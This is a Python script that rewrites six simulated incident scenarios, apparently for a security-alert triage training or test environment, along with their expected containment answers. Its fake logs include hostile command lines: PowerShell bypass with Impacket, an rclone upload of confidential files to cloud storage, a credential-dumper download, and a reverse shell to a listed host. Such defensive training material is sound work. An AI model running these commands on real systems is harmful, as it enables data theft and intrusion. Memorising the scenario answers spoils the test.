import re

with open('server/scenarios.py', 'r') as f:
    content = f.read()

# We need to replace the definitions of s4, s5, s6, s7, s18, s19.
# The easiest way is to find each Scenario( id="sX"...) and replace it.

replacements = {
    "s4": """        Scenario(
            id="s4",
            difficulty=MEDIUM,
            attack_type="lateral_movement",
            is_real_threat=True,
            alert_text="Unusual SMB traffic detected from HR-Desktop to Finance-Server.",
            optimal_containment="isolate_machine",
            mitre_id="T1021",
            time_limit_mins=20,
            key_evidence_keys=["HR-Desktop", "Finance-Server"],
            logs_data={
                "HR-Desktop": "PowerShell execution of suspected offensive tools (Impacket) detected. Process spawned by wmiprvse.exe.",
                "Finance-Server": "Successful authentication from HR-Desktop via NTLM."
            },
            threat_intel_data={
                "HR-Desktop": "Internal IP, no external threat intel.",
                "Finance-Server": "Internal IP, no external threat intel."
            },
            asset_inventory_data={
                "Finance-Server": "Critical internal server hosting ERP database.",
                "HR-Desktop": "Standard employee workstation."
            },
            db_logs=[
                {"timestamp": "2026-04-12T10:01:00Z", "source_ip": "10.0.1.20", "dest_ip": "10.0.2.50", "event_type": "SMB_CONNECT", "message": "SMB connection from HR-Desktop to Finance-Server on port 445", "severity": "MEDIUM", "username": "kthomas", "process": "svchost.exe"},
                {"timestamp": "2026-04-12T10:01:05Z", "source_ip": "10.0.1.20", "dest_ip": "10.0.2.50", "event_type": "PROCESS_EXEC", "message": "HR-Desktop: wmiprvse.exe spawned powershell.exe -ep bypass -c Import-Module Impacket", "severity": "CRITICAL", "username": "kthomas", "process": "wmiprvse.exe"},
                {"timestamp": "2026-04-12T10:01:30Z", "source_ip": "10.0.1.20", "dest_ip": "10.0.2.50", "event_type": "AUTH_SUCCESS", "message": "Finance-Server: NTLM authentication accepted from HR-Desktop for user kthomas", "severity": "HIGH", "username": "kthomas"},
                {"timestamp": "2026-04-12T10:02:00Z", "source_ip": "10.0.1.20", "dest_ip": "10.0.2.50", "event_type": "FILE_ACCESS", "message": "Finance-Server: kthomas accessed \\\\\\\\Finance-Server\\\\ERP_Exports\\\\ — 15 files read", "severity": "HIGH", "username": "kthomas"},
                {"timestamp": "2026-04-12T10:02:45Z", "source_ip": "10.0.1.20", "dest_ip": "10.0.2.50", "event_type": "PROCESS_EXEC", "message": "Finance-Server: cmd.exe spawned by psexecsvc — remote code execution indicator", "severity": "CRITICAL", "username": "SYSTEM", "process": "psexecsvc.exe"},
            ],
            db_assets=[
                {"hostname": "HR-Desktop", "ip": "10.0.1.20", "owner": "Karen Thomas", "department": "Human Resources", "criticality": "MEDIUM", "os": "Windows 11", "notes": "HR workstation. Should NOT initiate SMB connections to Finance-Server.", "known_safe": False},
                {"hostname": "Finance-Server", "ip": "10.0.2.50", "owner": "CFO Office", "department": "Finance", "criticality": "CRITICAL", "os": "Windows Server 2022", "notes": "ERP financial database server. Restricted access — Finance team only.", "known_safe": False},
            ],
            db_threat_intel=[
                {"indicator": "HR-Desktop", "indicator_type": "hostname", "reputation": "SUSPICIOUS", "confidence": 75, "context": "Internal host exhibiting lateral movement behavior. Impacket toolset detected — commonly used in pass-the-hash attacks.", "mitre_techniques": "T1021.002 - SMB/Windows Admin Shares"},
                {"indicator": "impacket", "indicator_type": "process", "reputation": "MALICIOUS", "confidence": 90, "context": "Impacket is an open-source offensive security toolkit used for network protocol attacks. Legitimate use is rare in production environments.", "mitre_techniques": "T1021 - Remote Services"},
            ],
        )""",
    "s5": """        Scenario(
            id="s5",
            difficulty=MEDIUM,
            attack_type="privilege_escalation",
            is_real_threat=True,
            alert_text="User 'bsmith' added to Domain Admins group by unfamiliar account 'svc_backup'.",
            optimal_containment="password_reset",
            mitre_id="T1078",
            time_limit_mins=20,
            key_evidence_keys=["bsmith", "svc_backup"],
            logs_data={
                "bsmith": "Normal user account. Password last changed 7 years ago.",
                "svc_backup": "Service account logged into interactively from an unusual workstation."
            },
            threat_intel_data={
                "svc_backup": "Internal account. No external threat intel available."
            },
            asset_inventory_data={
                "bsmith": "Bob Smith, Marketing Intern.",
                "svc_backup": "Backup service account with high privileges across domain."
            },
            db_logs=[
                {"timestamp": "2026-04-12T02:17:00Z", "source_ip": "10.0.5.88", "dest_ip": "172.16.0.1", "event_type": "AUTH_SUCCESS", "message": "svc_backup interactive logon from workstation WS-MKTG-08 at 02:17 AM — anomalous for service account", "severity": "HIGH", "username": "svc_backup"},
                {"timestamp": "2026-04-12T02:17:45Z", "source_ip": "10.0.5.88", "dest_ip": "172.16.0.1", "event_type": "GROUP_CHANGE", "message": "Domain Admins group modified: svc_backup added bsmith (S-1-5-21-...) to 'Domain Admins'", "severity": "CRITICAL", "username": "svc_backup"},
                {"timestamp": "2026-04-12T02:18:30Z", "source_ip": "10.0.5.88", "dest_ip": "172.16.0.1", "event_type": "AUTH_SUCCESS", "message": "bsmith authenticated with elevated Domain Admin privileges", "severity": "CRITICAL", "username": "bsmith"},
                {"timestamp": "2026-04-12T02:19:00Z", "source_ip": "10.0.5.88", "dest_ip": "10.0.0.0/8", "event_type": "NETWORK_SCAN", "message": "bsmith account used for LDAP enumeration of all domain accounts and groups", "severity": "HIGH", "username": "bsmith"},
            ],
            db_assets=[
                {"hostname": "WS-MKTG-08", "ip": "10.0.5.88", "owner": "Bob Smith", "department": "Marketing", "criticality": "LOW", "os": "Windows 11", "notes": "Standard marketing workstation. bsmith is an intern with no admin rights.", "known_safe": False},
                {"hostname": "DC-01", "ip": "172.16.0.1", "owner": "IT Operations", "department": "IT", "criticality": "CRITICAL", "os": "Windows Server 2022", "notes": "Primary Domain Controller.", "known_safe": True},
            ],
            db_threat_intel=[
                {"indicator": "svc_backup", "indicator_type": "user", "reputation": "SUSPICIOUS", "confidence": 85, "context": "Service account that should NEVER log in interactively. Interactive login at 2AM is a strong compromise indicator. Account has domain-wide backup privileges.", "mitre_techniques": "T1078.002 - Domain Accounts"},
                {"indicator": "bsmith", "indicator_type": "user", "reputation": "SUSPICIOUS", "confidence": 70, "context": "Marketing intern. Password unchanged for 7 years. Newly elevated to Domain Admin — almost certainly unauthorized.", "mitre_techniques": "T1078 - Valid Accounts"},
            ],
        )""",
    "s6": """        Scenario(
            id="s6",
            difficulty=MEDIUM,
            attack_type="false_positive",
            is_real_threat=False,
            alert_text="Impossible travel alert. User 'asmith' logged in from New York (US) and London (UK) within 2 hours.",
            optimal_containment="dismiss",
            mitre_id="None",
            time_limit_mins=20,
            key_evidence_keys=["asmith", "London IP"],
            logs_data={
                "asmith": "Login from New York IP (Office VPN). Login from London IP (Commercial VPN provider)."
            },
            threat_intel_data={
                "London IP": "Known exit node for NordVPN instance.",
                "New York IP": "Corporate IP range."
            },
            asset_inventory_data={
                "asmith": "Alice Smith, Sales Exec. Currently traveling to UK. Pre-approved remote access."
            },
            db_logs=[
                {"timestamp": "2026-04-12T09:00:00Z", "source_ip": "198.51.100.10", "dest_ip": "10.0.0.1", "event_type": "AUTH_SUCCESS", "message": "asmith VPN login from corporate New York IP 198.51.100.10", "severity": "LOW", "username": "asmith"},
                {"timestamp": "2026-04-12T10:45:00Z", "source_ip": "185.220.101.50", "dest_ip": "10.0.0.1", "event_type": "AUTH_SUCCESS", "message": "asmith login from London IP 185.220.101.50 — flagged as impossible travel (105 min gap)", "severity": "MEDIUM", "username": "asmith"},
                {"timestamp": "2026-04-12T10:46:00Z", "source_ip": "185.220.101.50", "dest_ip": "10.0.0.5", "event_type": "FILE_ACCESS", "message": "asmith accessed standard sales CRM dashboard — normal business access", "severity": "LOW", "username": "asmith"},
            ],
            db_assets=[
                {"hostname": "VPN-GW-01", "ip": "10.0.0.1", "owner": "IT Operations", "department": "IT", "criticality": "HIGH", "os": "Linux", "notes": "Corporate VPN gateway.", "known_safe": True},
            ],
            db_threat_intel=[
                {"indicator": "185.220.101.50", "indicator_type": "ip", "reputation": "CLEAN", "confidence": 95, "context": "NordVPN commercial exit node in London. Expected traffic for remote workers using personal VPN. Not associated with malicious activity.", "mitre_techniques": ""},
                {"indicator": "198.51.100.10", "indicator_type": "ip", "reputation": "CLEAN", "confidence": 100, "context": "Corporate New York office IP range. Expected source for asmith's normal logins.", "mitre_techniques": ""},
                {"indicator": "asmith", "indicator_type": "user", "reputation": "CLEAN", "confidence": 90, "context": "Alice Smith, Senior Sales Executive. HR travel records confirm she is in London for client meetings 2026-04-12 to 2026-04-15. Pre-approved remote access on file.", "mitre_techniques": ""},
            ],
        )""",
    "s7": """        Scenario(
            id="s7",
            difficulty=MEDIUM,
            attack_type="phishing",
            is_real_threat=True,
            alert_text="Email gateway alert: User 'mwilson' clicked a link in a suspected phishing email from sender 'hr-update@corp-it-support.net'.",
            optimal_containment="password_reset",
            mitre_id="T1566",
            time_limit_mins=20,
            key_evidence_keys=["mwilson", "corp-it-support.net"],
            logs_data={
                "mwilson": "Browser navigated to corp-it-support.net/login. Credentials submitted via POST. Session active."
            },
            threat_intel_data={
                "corp-it-support.net": "Domain registered 2 days ago. Flagged as phishing site mimicking corporate IT portal."
            },
            asset_inventory_data={
                "mwilson": "Mike Wilson, Finance Analyst. Access to AP/AR systems and bank transfers."
            },
            db_logs=[
                {"timestamp": "2026-04-12T11:22:00Z", "source_ip": "10.0.3.77", "dest_ip": "93.184.216.100", "event_type": "EMAIL_CLICK", "message": "mwilson clicked URL in email from hr-update@corp-it-support.net: https://corp-it-support.net/login?r=portal", "severity": "HIGH", "username": "mwilson", "process": "chrome.exe"},
                {"timestamp": "2026-04-12T11:22:05Z", "source_ip": "10.0.3.77", "dest_ip": "93.184.216.100", "event_type": "HTTP_POST", "message": "POST to corp-it-support.net/login — form data submitted (credentials captured by phishing site)", "severity": "CRITICAL", "username": "mwilson", "process": "chrome.exe"},
                {"timestamp": "2026-04-12T11:23:00Z", "source_ip": "93.184.216.100", "dest_ip": "10.0.0.1", "event_type": "AUTH_SUCCESS", "message": "mwilson credentials used from external IP 93.184.216.100 — likely attacker using captured creds", "severity": "CRITICAL", "username": "mwilson"},
                {"timestamp": "2026-04-12T11:24:00Z", "source_ip": "93.184.216.100", "dest_ip": "10.0.3.90", "event_type": "FILE_ACCESS", "message": "mwilson session accessed AP payment queue and 3 pending wire transfer records", "severity": "CRITICAL", "username": "mwilson"},
            ],
            db_assets=[
                {"hostname": "FIN-WS-07", "ip": "10.0.3.77", "owner": "Mike Wilson", "department": "Finance", "criticality": "HIGH", "os": "Windows 11", "notes": "Finance analyst workstation. Has access to AP/AR and bank transfer systems.", "known_safe": False},
                {"hostname": "AP-SRV-01", "ip": "10.0.3.90", "owner": "Finance Team", "department": "Finance", "criticality": "CRITICAL", "os": "Windows Server 2019", "notes": "Accounts payable server. Handles wire transfers up to $500K.", "known_safe": False},
            ],
            db_threat_intel=[
                {"indicator": "corp-it-support.net", "indicator_type": "domain", "reputation": "MALICIOUS", "confidence": 99, "context": "Registered 2 days ago via NameCheap. Hosting phishing page that clones corporate IT portal login page. Collected credentials from at least 3 other victims in past 48h. Typosquatting attack.", "mitre_techniques": "T1566.002 - Spearphishing Link"},
                {"indicator": "93.184.216.100", "indicator_type": "ip", "reputation": "MALICIOUS", "confidence": 85, "context": "IP hosting corp-it-support.net phishing infrastructure. Located in Eastern Europe. Not in any corporate allowlist.", "mitre_techniques": "T1566 - Phishing"},
                {"indicator": "mwilson", "indicator_type": "user", "reputation": "CLEAN", "confidence": 80, "context": "Legitimate finance employee. Account should be treated as compromised given credential submission to phishing site.", "mitre_techniques": ""},
            ],
        )""",
    "s18": """        Scenario(
            id="s18",
            difficulty=MEDIUM,
            attack_type="data_exfiltration",
            is_real_threat=True,
            alert_text="Large outbound upload (20GB) to external cloud storage 'drive.google.com' from Marketing-PC.",
            optimal_containment="isolate_machine",
            mitre_id="T1567",
            time_limit_mins=20,
            key_evidence_keys=["Marketing-PC", "drive.google.com"],
            logs_data={
                "Marketing-PC": "Rclone utility spawned by unapproved script. Uploading C:\\\\Confidential\\\\ to external Drive.",
                "drive.google.com": "20GB transferred in 10 minutes."
            },
            threat_intel_data={
                "Marketing-PC": "Standard workstation. Corporate policy forbids external unauthorized cloud storage.",
                "drive.google.com": "Legitimate service, often abused for exfiltration."
            },
            asset_inventory_data={
                "Marketing-PC": "Workstation belonging to a recently terminated employee.",
            },
            db_logs=[
                {"timestamp": "2026-04-12T03:00:00Z", "source_ip": "10.0.4.55", "dest_ip": "142.250.80.100", "event_type": "PROCESS_EXEC", "message": "Marketing-PC: rclone.exe spawned by offboard_cleanup.bat with args: rclone copy C:\\\\Confidential\\\\ gdrive:exfil_backup", "severity": "CRITICAL", "username": "jmartin_old", "process": "rclone.exe"},
                {"timestamp": "2026-04-12T03:00:10Z", "source_ip": "10.0.4.55", "dest_ip": "142.250.80.100", "event_type": "NETWORK_CONN", "message": "Marketing-PC: 20.4 GB HTTPS upload to drive.google.com in 10 minutes — anomalous upload rate", "severity": "CRITICAL", "process": "rclone.exe"},
                {"timestamp": "2026-04-12T03:10:30Z", "source_ip": "10.0.4.55", "dest_ip": "142.250.80.100", "event_type": "FILE_ACCESS", "message": "Marketing-PC: rclone accessed C:\\\\Confidential\\\\Customer_PII.xlsx, NDA_Contracts.zip, Product_Roadmap_2026.pptx and 847 other files", "severity": "CRITICAL"},
            ],
            db_assets=[
                {"hostname": "Marketing-PC", "ip": "10.0.4.55", "owner": "Jordan Martin (TERMINATED)", "department": "Marketing", "criticality": "MEDIUM", "os": "Windows 11", "notes": "Workstation of terminated employee Jordan Martin. Off-boarding ticket #8841 in progress. Machine should have been wiped — IT missed the deadline.", "known_safe": False},
            ],
            db_threat_intel=[
                {"indicator": "drive.google.com", "indicator_type": "domain", "reputation": "SUSPICIOUS", "confidence": 70, "context": "Legitimate Google service. Frequently abused by insiders for unauthorized data exfiltration. Policy violation when used without IT approval for bulk transfers.", "mitre_techniques": "T1567.002 - Exfiltration to Cloud Storage"},
                {"indicator": "rclone.exe", "indicator_type": "process", "reputation": "SUSPICIOUS", "confidence": 80, "context": "Rclone is a legitimate sync tool frequently abused for data exfiltration. Not approved for use on Marketing-PC. Presence is a strong indicator of intentional data theft.", "mitre_techniques": "T1567 - Exfiltration Over Web Service"},
            ],
        )""",
    "s19": """        Scenario(
            id="s19",
            difficulty=MEDIUM,
            attack_type="malware_infection",
            is_real_threat=True,
            alert_text="Suspicious PowerShell command with base64 encoded payload executed on WebServer-02.",
            optimal_containment="isolate_machine",
            mitre_id="T1059",
            time_limit_mins=20,
            key_evidence_keys=["WebServer-02"],
            logs_data={
                "WebServer-02": "powershell.exe -enc <payload>. Decoded payload attempts to download mimikatz from 198.51.100.4."
            },
            threat_intel_data={
                "198.51.100.4": "IP flagged for distributing offensive security tools / malware."
            },
            asset_inventory_data={
                "WebServer-02": "Public-facing IIS web server. High criticality."
            },
            db_logs=[
                {"timestamp": "2026-04-12T14:07:00Z", "source_ip": "10.0.6.30", "dest_ip": "198.51.100.4", "event_type": "PROCESS_EXEC", "message": "WebServer-02: w3wp.exe spawned cmd.exe then powershell.exe -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...", "severity": "CRITICAL", "username": "NETWORK SERVICE", "process": "w3wp.exe"},
                {"timestamp": "2026-04-12T14:07:03Z", "source_ip": "10.0.6.30", "dest_ip": "198.51.100.4", "event_type": "NETWORK_CONN", "message": "WebServer-02: outbound HTTP GET to 198.51.100.4/files/mimi.exe — downloading credential dumper", "severity": "CRITICAL", "process": "powershell.exe"},
                {"timestamp": "2026-04-12T14:07:15Z", "source_ip": "10.0.6.30", "dest_ip": "198.51.100.4", "event_type": "PROCESS_EXEC", "message": "WebServer-02: mimi.exe executed — Mimikatz credential dump attempted on LSASS", "severity": "CRITICAL", "process": "mimi.exe"},
                {"timestamp": "2026-04-12T14:07:45Z", "source_ip": "10.0.6.30", "dest_ip": "198.51.100.4", "event_type": "NETWORK_CONN", "message": "WebServer-02: reverse shell established to 198.51.100.4:4444 — interactive attacker session", "severity": "CRITICAL", "process": "cmd.exe"},
            ],
            db_assets=[
                {"hostname": "WebServer-02", "ip": "10.0.6.30", "owner": "Web Team", "department": "Engineering", "criticality": "HIGH", "os": "Windows Server 2019 IIS", "notes": "Public-facing IIS web server. Serves company website and customer portal. Patch level: 3 months behind.", "known_safe": False},
            ],
            db_threat_intel=[
                {"indicator": "198.51.100.4", "indicator_type": "ip", "reputation": "MALICIOUS", "confidence": 95, "context": "Known C2 server distributing Mimikatz and reverse shells. 142 abuse reports in the past 7 days. Geo: Russia.", "mitre_techniques": "T1059.001 - PowerShell, T1003 - Credential Dumping"},
                {"indicator": "mimikatz", "indicator_type": "process", "reputation": "MALICIOUS", "confidence": 100, "context": "Credential dumping tool. Any execution in production environment is a confirmed incident.", "mitre_techniques": "T1003.001 - LSASS Memory"},
            ],
        )"""
}

for sid, replacement in replacements.items():
    # Find Scenario( id="sid", ... ) and carefully replace it
    # We will use regex to find the start of the scenario and the end of it (the closing ) )
    # This regex is a bit tricky but we know it's a list.
    pattern = r'        Scenario\(\n            id="' + sid + r'",\n(.*?)(?=\n        Scenario\(|\n    \])'
    
    # We need to use re.sub with a custom replacement or just replace strings carefully.
    # Since we can just dump the new tree into the match, let's try it.
    
    match = re.search(pattern, content, re.DOTALL)
    if match:
        content = content[:match.start()] + replacement + content[match.end():]
    else:
        # Maybe the comma is different or it's the last one
        pattern2 = r'        Scenario\(\n            id="' + sid + r'",\n(.*?)(?=\n        \])'
        match2 = re.search(pattern2, content, re.DOTALL)
        if match2:
             content = content[:match2.start()] + replacement + content[match2.end():]

# Let's do a simpler approach: just replace the block knowing exactly how it looks
def replace_block(text, start_str, end_str, new_block):
    start_idx = text.find(start_str)
    if start_idx == -1: return text
    # end_idx is the index of the first Scenario( or ] after start_str
    next_scenario = text.find('        Scenario(', start_idx + len('        Scenario('))
    end_bracket = text.find('    ]', start_idx)
    
    end_idx = next_scenario if next_scenario != -1 and next_scenario < end_bracket else end_bracket
    
    return text[:start_idx] + new_block + '\n' + text[end_idx:]

with open('server/scenarios.py', 'r') as f:
    text = f.read()

for sid, replacement in replacements.items():
    text = replace_block(text, f'        Scenario(\n            id="{sid}",', '', replacement)

with open('server/scenarios.py', 'w') as f:
    f.write(text)

print("Patched.")
